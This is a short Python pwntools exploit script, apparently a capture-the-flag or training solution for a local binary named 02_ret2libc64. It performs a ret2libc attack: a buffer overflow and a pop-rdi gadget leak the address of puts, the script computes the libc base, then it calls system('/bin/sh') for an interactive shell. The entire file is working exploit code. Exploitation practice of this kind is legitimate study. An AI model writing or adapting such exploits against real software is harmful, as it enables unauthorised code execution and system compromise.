#!/bin/python3
from pwn import *
context.log_level = 'debug'

io = process(['./02_ret2libc64'])


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./02_ret2libc64')

system_offset = libc.symbols['system']
exit_offset = libc.symbols['exit']
binsh_offset = next(libc.search(b'/bin/sh'))

#leak the address of puts function.
puts_offset = libc.symbols['puts']
puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
hear_addr = elf.symbols['hear']
#hear_addr = 0x401156

#The following is useful gadget.
#0x401213 : pop rdi ; ret
pop_rdi_ret_addr = 0x401213
#ret address;
ret_addr = 0x40101a

#leak the address of puts function.
io.recvuntil(b"some data:\n")
payload1 = b'A'*0x20 + b'B'*8 + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(hear_addr)
io.sendline(payload1)
puts_addr = u64(io.recvline()[0:6]+b'\x00'*2)
print(hex(puts_addr))
libc_base_addr = puts_addr - puts_offset

system_addr = libc_base_addr + system_offset
binsh_addr = libc_base_addr + binsh_offset
exit_addr = libc_base_addr + exit_offset

payload2 = b'A'*0x20 + b'B'*8 + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(ret_addr) + p64(system_addr) + p64(exit_addr)
io.sendline(payload2)

io.interactive()
